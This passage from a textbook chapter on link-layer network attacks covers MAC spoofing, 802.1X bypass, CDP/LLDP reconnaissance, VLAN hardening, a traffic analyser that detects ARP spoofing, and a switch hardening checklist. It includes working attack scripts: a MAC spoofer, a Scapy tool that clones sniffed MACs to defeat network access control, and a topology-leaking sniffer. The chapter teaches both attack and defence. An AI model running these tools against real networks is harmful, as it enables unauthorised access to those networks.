        mac = [random.randint(0x00, 0xff) for _ in range(6)]
        # Set locally administered bit
        mac[0] = (mac[0] & 0xFE) | 0x02
        return ':'.join(map(lambda x: "%02x" % x, mac))
    
    def vendor_mac(self, vendor):
        """Generate MAC with specific vendor OUI"""
        vendors = {
            'cisco': '00:1A:2B',
            'vmware': 'AA:BB:CC',
            'dell': 'B8:2A:72',
            'hp': '00:1E:0B',
            'apple': 'A4:C3:61'
        }
        
        oui = vendors.get(vendor.lower())
        if not oui:
            print(f"[-] Unknown vendor: {vendor}")
            return None
        
        # Generate random last 3 bytes
        random_bytes = [random.randint(0x00, 0xff) for _ in range(3)]
        mac = oui + ':' + ':'.join(map(lambda x: "%02x" % x, random_bytes))
        
        return mac
    
    def restore(self):
        """Restore original MAC"""
        if self.original_mac:
            self.change_mac(self.original_mac)
        else:
            print("[-] Original MAC unknown")

# Example usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 mac_spoof.py <interface>")
        sys.exit(1)
    
    interface = sys.argv[1]
    spoofer = MACSpoofer(interface)
    
    print("""
1. Random MAC
2. Vendor-specific MAC
3. Custom MAC
4. Restore original
5. Exit
    """)
    
    choice = input("[?] Select option: ")
    
    if choice == "1":
        new_mac = spoofer.random_mac()
        spoofer.change_mac(new_mac)
    
    elif choice == "2":
        vendor = input("[?] Vendor (cisco/vmware/dell/hp/apple): ")
        new_mac = spoofer.vendor_mac(vendor)
        if new_mac:
            spoofer.change_mac(new_mac)
    
    elif choice == "3":
        new_mac = input("[?] Enter MAC (xx:xx:xx:xx:xx:xx): ")
        spoofer.change_mac(new_mac)
    
    elif choice == "4":
        spoofer.restore()
```

---

## 11. VLAN Security Deep Dive

### 11.1 VLAN Best Practices

**For Beginners - VLAN Security Rules**:

```
DO:
✓ Use separate VLANs for different security zones
✓ Change native VLAN from default (VLAN 1)
✓ Explicitly configure trunk allowed VLANs
✓ Disable DTP on all ports
✓ Prune unused VLANs from trunks
✓ Use Private VLANs for additional isolation

DON'T:
✗ Leave VLAN 1 as native VLAN
✗ Use auto-trunking (DTP)
✗ Allow all VLANs on trunks
✗ Put management on user VLANs
✗ Assume VLANs provide security isolation
```

### 11.2 VLAN Segmentation Strategy

```
Example Corporate Network:

VLAN 10 - User Workstations
  - General employee computers
  - Restricted internet access
  - No access to servers

VLAN 20 - Servers
  - Application servers
  - Database servers
  - Only accessible from specific VLANs

VLAN 30 - VoIP
  - IP phones
  - Separate QoS policies
  - Isolated from data traffic

VLAN 40 - Guest WiFi
  - No access to internal resources
  - Internet only
  - Heavily restricted

VLAN 100 - Management
  - Switch/router management
  - Monitoring systems
  - Highly restricted access

VLAN 999 - Unused/Quarantine
  - Disabled ports
  - Compromised devices
```

### 11.3 Private VLANs (PVLANs)

**Purpose**: Additional isolation within a VLAN.

**Types of PVLAN ports**:
- **Promiscuous**: Can communicate with all (typically gateway)
- **Isolated**: Can only communicate with promiscuous (no peer-to-peer)
- **Community**: Can communicate with same community + promiscuous

**Configuration**:
```cisco
! Create primary VLAN
vlan 100
  private-vlan primary
  private-vlan association 101,102

! Create isolated VLAN
vlan 101
  private-vlan isolated

! Create community VLAN
vlan 102
  private-vlan community

! Configure promiscuous port (gateway)
interface GigabitEthernet0/1
  switchport mode private-vlan promiscuous
  switchport private-vlan mapping 100 101,102

! Configure isolated ports (can't talk to each other)
interface range GigabitEthernet0/2-10
  switchport mode private-vlan host
  switchport private-vlan host-association 100 101

! Configure community ports (can talk to each other)
interface range GigabitEthernet0/11-20
  switchport mode private-vlan host
  switchport private-vlan host-association 100 102
```

---

## 12. 802.1X Authentication Attacks

### 12.1 Understanding 802.1X

**For Beginners**: 802.1X is port-based network access control.

```
802.1X Components:
┌──────────────┐      ┌──────────────┐      ┌──────────────┐
│  Supplicant  │      │Authenticator │      │    RADIUS    │
│   (Client)   │◄────►│   (Switch)   │◄────►│    Server    │
└──────────────┘      └──────────────┘      └──────────────┘
     Wants               Controls              Decides
     Access               Port                 Auth
```

**Authentication Flow**:
```
1. Client connects to switch port
2. Port is in "unauthorized" state
3. Client sends credentials (EAP)
4. Switch forwards to RADIUS server
5. RADIUS validates credentials
6. If OK, switch opens port
7. Client gets network access
```

### 12.2 802.1X Bypass Techniques

**Technique 1: MAC Spoofing**

If switch allows pre-auth traffic, spoof authenticated device:

```bash
# 1. Sniff for authenticated MAC
sudo tcpdump -i eth0 -e -n

# 2. Change your MAC to match
sudo macchanger -m aa:bb:cc:dd:ee:ff eth0

# 3. Connect and hope switch remembers the MAC
```

**Technique 2: Hub Insertion**

```
Normal:
[Authenticated PC] ──► [Switch Port]

Attack:
[Authenticated PC] ──► [Hub] ──┬──► [Switch Port]
                                │
                                └──► [Attacker PC]

Result: Attacker piggybacks on authenticated session
```

**Technique 3: NAC Bypass Script**

```python
#!/usr/bin/env python3
"""
802.1X NAC Bypass via MAC Cloning
"""

from scapy.all import *
import subprocess
import time

def nac_bypass(interface="eth0", timeout=30):
    """
    Attempt to bypass 802.1X by cloning authenticated MAC
    """
    print("""
╔══════════════════════════════════════════════════════════╗
║        802.1X NAC BYPASS                                 ║
╚══════════════════════════════════════════════════════════╝

[*] Listening for authenticated devices...
    """)
    
    authenticated_macs = set()
    
    def packet_handler(pkt):
        """Capture MAC addresses of devices passing auth"""
        if Ether in pkt:
            src_mac = pkt[Ether].src
            
            # If we see substantial traffic from a MAC, it's likely authenticated
            if src_mac not in authenticated_macs:
                authenticated_macs.add(src_mac)
                print(f"[+] Detected active device: {src_mac}")
    
    # Sniff for a period
    print(f"[*] Sniffing for {timeout} seconds...")
    sniff(iface=interface, prn=packet_handler, timeout=timeout, store=False)
    
    if not authenticated_macs:
        print("[-] No active devices detected")
        return
    
    # Try each MAC
    for mac in authenticated_macs:
        print(f"\n[*] Attempting bypass with MAC: {mac}")
        
        # Change our MAC
        subprocess.call(['sudo', 'ifconfig', interface, 'down'])
        subprocess.call(['sudo', 'ifconfig', interface, 'hw', 'ether', mac])
        subprocess.call(['sudo', 'ifconfig', interface, 'up'])
        
        print(f"[*] MAC changed to {mac}")
        print(f"[*] Waiting for network access...")
        
        time.sleep(10)
        
        # Test connectivity
        test = subprocess.call(['ping', '-c', '1', '8.8.8.8'],
                              stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
        
        if test == 0:
            print(f"[+] SUCCESS! Network access obtained with MAC: {mac}")
            return
        else:
            print(f"[-] Failed with {mac}")
    
    print("\n[-] All attempts failed")

# Example usage
if __name__ == "__main__":
    interface = input("[?] Interface (default: eth0): ") or "eth0"
    timeout = int(input("[?] Sniff duration in seconds (default: 30): ") or "30")
    
    nac_bypass(interface, timeout)
```

---

## 13. Switch Exploitation Techniques

### 13.1 CDP/LLDP Information Disclosure

**CDP (Cisco Discovery Protocol)** and **LLDP (Link Layer Discovery Protocol)** leak network topology information.

**Information Disclosed**:
- Device hostname
- IP addresses
- Software version
- Platform/model
- Port identifiers
- VLAN information

**Sniffing CDP/LLDP**:

```python
#!/usr/bin/env python3
"""
CDP/LLDP Information Gathering
"""

from scapy.all import *

def sniff_cdp_lldp(interface="eth0", timeout=60):
    """
    Capture and parse CDP/LLDP packets
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║        CDP/LLDP INFORMATION GATHERING                    ║
╚══════════════════════════════════════════════════════════╝

[*] Listening on {interface} for {timeout} seconds...
    """)
    
    devices = {}
    
    def process_cdp(pkt):
        """Process CDP packets"""
        if pkt.haslayer('CDPMsgDeviceID'):
            device_id = pkt['CDPMsgDeviceID'].val.decode()
            
            if device_id not in devices:
                devices[device_id] = {}
                print(f"\n[+] Discovered device: {device_id}")
            
            # Extract information
            if pkt.haslayer('CDPMsgAddr'):
                ip = pkt['CDPMsgAddr'].addr
                devices[device_id]['ip'] = ip
                print(f"    IP Address: {ip}")
            
            if pkt.haslayer('CDPMsgSoftwareVersion'):
                version = pkt['CDPMsgSoftwareVersion'].val.decode()
                devices[device_id]['version'] = version
                print(f"    Software: {version[:50]}...")
            
            if pkt.haslayer('CDPMsgPlatform'):
                platform = pkt['CDPMsgPlatform'].val.decode()
                devices[device_id]['platform'] = platform
                print(f"    Platform: {platform}")
    
    def process_lldp(pkt):
        """Process LLDP packets"""
        if pkt.haslayer('LLDPDUChassisID'):
            chassis_id = pkt['LLDPDUChassisID'].id.decode(errors='ignore')
            
            if chassis_id not in devices:
                devices[chassis_id] = {}
                print(f"\n[+] Discovered device (LLDP): {chassis_id}")
            
            if pkt.haslayer('LLDPDUSystemName'):
                name = pkt['LLDPDUSystemName'].system_name.decode()
                devices[chassis_id]['name'] = name
                print(f"    System Name: {name}")
            
            if pkt.haslayer('LLDPDUManagementAddress'):
                mgmt_addr = pkt['LLDPDUManagementAddress'].management_address
                devices[chassis_id]['mgmt_ip'] = mgmt_addr
                print(f"    Management IP: {mgmt_addr}")
    
    # Sniff for CDP (dest MAC 01:00:0c:cc:cc:cc)
    # and LLDP (dest MAC 01:80:c2:00:00:0e)
    packets = sniff(iface=interface, 
                   filter="ether dst 01:00:0c:cc:cc:cc or ether dst 01:80:c2:00:00:0e",
                   timeout=timeout, store=True)
    
    for pkt in packets:
        if 'CDPMsgDeviceID' in pkt:
            process_cdp(pkt)
        elif 'LLDPDUChassisID' in pkt:
            process_lldp(pkt)
    
    # Summary
    print(f"\n{'='*60}")
    print(f"DISCOVERED DEVICES ({len(devices)})")
    print(f"{'='*60}")
    
    for device, info in devices.items():
        print(f"\nDevice: {device}")
        for key, value in info.items():
            print(f"  {key}: {value}")

# Example usage
if __name__ == "__main__":
    interface = input("[?] Interface (default: eth0): ") or "eth0"
    timeout = int(input("[?] Timeout in seconds (default: 60): ") or "60")
    
    sniff_cdp_lldp(interface, timeout)
```

**Defense**: Disable CDP/LLDP on user-facing ports:

```cisco
! Disable CDP globally
no cdp run

! Or per-interface
interface range GigabitEthernet0/1-20
  no cdp enable
  no lldp transmit
  no lldp receive
```

---

## 14. Traffic Analysis and Sniffing

### 14.1 Passive vs Active Sniffing

**For Beginners**:

**Passive Sniffing** (Hub environment):
- Just listen
- No packets sent
- Undetectable
- Only works on hubs or when already MITM

**Active Sniffing** (Switch environment):
- Must manipulate network (ARP spoofing, MAC flooding)
- Sends attack packets
- Detectable
- Required for modern switched networks

### 14.2 Advanced Wireshark Filters for L2 Analysis

```
# ARP traffic
arp

# ARP requests only
arp.opcode == 1

# ARP replies only
arp.opcode == 2

# Gratuitous ARP
arp.isgratuitous

# Duplicate IP detection
arp.duplicate-address-detected

# 802.1Q VLAN tagged
vlan

# Specific VLAN
vlan.id == 10

# CDP packets
cdp

# LLDP packets
lldp

# DHCP traffic
dhcp

# DHCP Discover
dhcp.option.dhcp == 1

# DHCP Offer
dhcp.option.dhcp == 2

# STP (Spanning Tree)
stp

# Broadcast frames
eth.dst == ff:ff:ff:ff:ff:ff

# Multicast frames
eth.dst[0] & 1

# MAC address filtering
eth.addr == aa:bb:cc:dd:ee:ff

# Specific source MAC
eth.src == aa:bb:cc:dd:ee:ff

# Combine filters
arp and eth.src == aa:bb:cc:dd:ee:ff
```

### 14.3 Packet Analysis Script

```python
#!/usr/bin/env python3
"""
Layer 2 Traffic Analyzer
Analyzes pcap files for L2 security issues
"""

from scapy.all import *
from collections import defaultdict

class L2Analyzer:
    def __init__(self, pcap_file):
        self.pcap_file = pcap_file
        self.packets = []
        self.stats = {
            'total': 0,
            'arp': 0,
            'vlan': 0,
            'cdp': 0,
            'lldp': 0,
            'dhcp': 0
        }
        self.mac_to_ip = defaultdict(set)
        self.ip_to_mac = defaultdict(set)
        self.arp_replies = []
        
    def load_pcap(self):
        """Load pcap file"""
        print(f"[*] Loading {self.pcap_file}...")
        self.packets = rdpcap(self.pcap_file)
        self.stats['total'] = len(self.packets)
        print(f"[+] Loaded {self.stats['total']} packets")
    
    def analyze(self):
        """Analyze packets"""
        print(f"\n[*] Analyzing packets...")
        
        for pkt in self.packets:
            # ARP analysis
            if ARP in pkt:
                self.stats['arp'] += 1
                self.analyze_arp(pkt)
            
            # VLAN analysis
            if Dot1Q in pkt:
                self.stats['vlan'] += 1
            
            # CDP analysis
            if 'CDPMsgDeviceID' in pkt:
                self.stats['cdp'] += 1
            
            # LLDP analysis
            if 'LLDPDUChassisID' in pkt:
                self.stats['lldp'] += 1
            
            # DHCP analysis
            if DHCP in pkt:
                self.stats['dhcp'] += 1
    
    def analyze_arp(self, pkt):
        """Analyze ARP packet"""
        if pkt[ARP].op == 2:  # ARP reply
            ip = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc
            
            self.mac_to_ip[mac].add(ip)
            self.ip_to_mac[ip].add(mac)
            
            self.arp_replies.append({
                'ip': ip,
                'mac': mac,
                'time': pkt.time
            })
    
    def detect_anomalies(self):
        """Detect security anomalies"""
        print(f"\n{'='*60}")
        print("SECURITY ANOMALY DETECTION")
        print(f"{'='*60}")
        
        # Check for IP-MAC conflicts (ARP spoofing indicator)
        print(f"\n[*] Checking for IP-MAC conflicts...")
        conflicts = 0
        
        for ip, macs in self.ip_to_mac.items():
            if len(macs) > 1:
                conflicts += 1
                print(f"[!] CONFLICT: IP {ip} seen with multiple MACs:")
                for mac in macs:
                    print(f"    - {mac}")
        
        if conflicts == 0:
            print("[+] No IP-MAC conflicts detected")
        else:
            print(f"\n[!] Total conflicts: {conflicts}")
            print("[!] Possible ARP spoofing attack!")
        
        # Check for MAC using multiple IPs
        print(f"\n[*] Checking for MAC address reuse...")
        reuse = 0
        
        for mac, ips in self.mac_to_ip.items():
            if len(ips) > 3:  # Threshold
                reuse += 1
                print(f"[!] SUSPICIOUS: MAC {mac} seen with {len(ips)} different IPs")
                print(f"    IPs: {list(ips)[:5]}...")
        
        if reuse == 0:
            print("[+] No suspicious MAC reuse detected")
        else:
            print(f"\n[!] Suspicious MACs: {reuse}")
            print("[!] Possible MAC flooding or spoofing!")
        
        # Check for gratuitous ARP
        print(f"\n[*] Checking for gratuitous ARP...")
        garp = 0
        
        for pkt in self.packets:
            if ARP in pkt and pkt[ARP].op == 2:
                if pkt[ARP].psrc == pkt[ARP].pdst:
                    garp += 1
        
        if garp > 0:
            print(f"[!] Found {garp} gratuitous ARP packets")
            print(f"[!] Could indicate failover or attack activity")
        else:
            print("[+] No gratuitous ARP detected")
    
    def print_summary(self):
        """Print analysis summary"""
        print(f"\n{'='*60}")
        print("ANALYSIS SUMMARY")
        print(f"{'='*60}")
        
        print(f"\nPacket Statistics:")
        print(f"  Total Packets:    {self.stats['total']}")
        print(f"  ARP Packets:      {self.stats['arp']}")
        print(f"  VLAN Tagged:      {self.stats['vlan']}")
        print(f"  CDP Packets:      {self.stats['cdp']}")
        print(f"  LLDP Packets:     {self.stats['lldp']}")
        print(f"  DHCP Packets:     {self.stats['dhcp']}")
        
        print(f"\nUnique Devices:")
        print(f"  MAC Addresses:    {len(self.mac_to_ip)}")
        print(f"  IP Addresses:     {len(self.ip_to_mac)}")

# Example usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 l2_analyzer.py <pcap_file>")
        sys.exit(1)
    
    analyzer = L2Analyzer(sys.argv[1])
    analyzer.load_pcap()
    analyzer.analyze()
    analyzer.detect_anomalies()
    analyzer.print_summary()
```

---

## 15. Critical Analysis & Checkpoints

### 15.1 Common Pitfalls

- **The "DoS" Accident**: Forgetting to enable IP forwarding. The victim sends you traffic, you drop it, and they lose internet. They effectively get DoS'd, and the admin starts investigating immediately.
- **SSL/TLS**: ARP spoofing gets you the *packets*, but if they are HTTPS (which 90% of the web is), you only see encrypted garbage. You must combine ARP Spoofing with **SSL Stripping** or **DNS Spoofing** to force HTTP, or prompt the user to accept a fake certificate.
- **Detection**: Modern networks have ARP inspection, port security, and monitoring. Your attack may trigger alerts.
- **Legal Issues**: ARP spoofing is illegal without authorization. Only perform in your own lab.

### 15.2 Interview Questions

1.  **Q**: Why does ARP spoofing usually not work across the internet?
    -   **A**: ARP is a Layer 2 protocol. It does not cross routers. It only works within the local Broadcast Domain (LAN/VLAN).

2.  **Q**: What is the difference between a Hub and a Switch regarding security?
    -   **A**: A Hub broadcasts everything to everyone (no privacy). A Switch isolates traffic to the destination port (privacy). However, ARP Spoofing or MAC Flooding can bypass switch isolation.

3.  **Q**: How can you detect ARP spoofing on a network?**
    -   **A**: Monitor for:
        - Duplicate IP addresses with different MACs
        - Rapid ARP cache changes
        - Gratuitous ARP from non-gateway devices
        - Use tools like arpwatch, XArp, or enable DAI on switches

4.  **Q**: What's the difference between MAC flooding and ARP spoofing?**
    -   **A**:
        - **MAC Flooding**: Overflows switch CAM table, causes switch to act like hub (broadcast all traffic)
        - **ARP Spoofing**: Poisons ARP cache to redirect traffic to attacker (man-in-the-middle)

5.  **Q**: Can VLAN hopping be completely prevented?**
    -   **A**: Yes, with proper configuration:
        - Disable DTP (use `switchport nonegotiate`)
        - Use non-default native VLAN
        - Explicitly configure trunk allowed VLANs
        - Use 802.1X authentication

6.  **Q**: How does DHCP snooping prevent rogue DHCP servers?**
    -   **A**: Switch marks ports as trusted (legitimate servers) or untrusted (clients). DHCP OFFER and ACK packets from untrusted ports are dropped, preventing rogue servers from responding to clients.

### 15.3 Defense Checklist

```
LAYER 2 SECURITY HARDENING CHECKLIST:

Port Security:
□ Enabled on all access ports
□ Maximum MAC addresses configured (1-2)
□ Violation action set to shutdown
□ Sticky MAC learning enabled where appropriate

ARP Security:
□ DHCP snooping enabled
□ Dynamic ARP Inspection (DAI) enabled
□ DAI rate limiting configured
□ Trusted ports properly designated

VLAN Security:
□ Native VLAN changed from default (not VLAN 1)
□ DTP disabled on all ports
□ Trunk ports explicitly configured
□ Allowed VLANs explicitly listed on trunks
□ Unused ports in separate VLAN and shutdown

DHCP Security:
□ DHCP snooping enabled
□ DHCP rate limiting configured
□ Rogue DHCP detection enabled

STP Security:
□ BPDU Guard enabled on access ports
□ Root Guard enabled on uplinks
□ PortFast enabled on access ports

Discovery Protocols:
□ CDP disabled on user ports
□ LLDP disabled on user ports

General:
□ Unused ports shutdown
□ Port descriptions configured
□ Logging enabled
□ SNMP secured (v3 only)
□ Management VLAN separated
```

### 15.4 Practice Exercises

**Exercise 1**: Set up a lab with 2 VMs and perform ARP spoofing to intercept HTTP traffic.

**Exercise 2**: Configure a Cisco switch with port security, DHCP snooping, and DAI. Try to bypass the security.

**Exercise 3**: Analyze a pcap file containing ARP spoofing attack. Identify the attacker's MAC address.

**Exercise 4**: Write a Python script to detect ARP spoofing in real-time by monitoring for duplicate IP-MAC mappings.

**Exercise 5**: Perform VLAN hopping using double tagging. Document what works and what doesn't.

---

## Summary

This chapter covered the fundamentals and advanced techniques of Layer 2 attacks:

**Key Concepts**:
- Ethernet and switching mechanisms (CAM table)
- ARP protocol and its vulnerabilities
- ARP spoofing for man-in-the-middle attacks
- Switch attacks: MAC flooding, VLAN hopping
- DHCP and STP attacks
- Defense mechanisms: Port Security, DHCP Snooping, DAI

**Attack Techniques**:
- ARP poisoning and traffic interception
- MAC address spoofing and manipulation
- VLAN hopping via DTP and double tagging
- DHCP starvation and rogue DHCP servers
- CDP/LLDP information disclosure

**Defense Strategies**:
- Comprehensive switch hardening
- Layer 2 security best practices
- Monitoring and detection techniques

**Practical Skills**:
- Using Bettercap, Scapy, and custom scripts
- Configuring Cisco switch security features
- Analyzing traffic for L2 attacks
- Building detection and prevention tools

### Next Steps

1. Practice in a safe lab environment
2. Study switch configuration documentation
3. Analyze real network traffic with Wireshark
4. Build your own L2 attack/defense tools
5. Understand how attacks chain together (L2 + L3 + L7)

---

*End of Chapter: Link Layer Attacks*

